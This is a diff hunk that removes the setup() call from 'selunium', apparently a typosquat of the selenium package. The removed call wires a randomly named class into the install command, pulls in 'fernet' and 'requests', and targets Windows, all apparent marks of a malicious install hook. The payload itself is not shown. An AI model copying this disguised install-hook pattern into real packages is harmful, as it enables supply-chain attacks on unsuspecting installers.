@@ -18,22 +18,5 @@ class KsYJSGuNAZnQiBEoIZLAVyQzkGeZgBnONEYncONKTdMAHyiiYjirVQoGQJbxYAhnHncfWNqwZa
             install.run(self)
 
 
-setup(
-    name="selunium",
-    version=VERSION,
-    author="dluIaABZQHTGXzuh",
-    author_email="LtkxqZJOnAKTEHiDQH@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': KsYJSGuNAZnQiBEoIZLAVyQzkGeZgBnONEYncONKTdMAHyiiYjirVQoGQJbxYAhnHncfWNqwZaeA,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
 
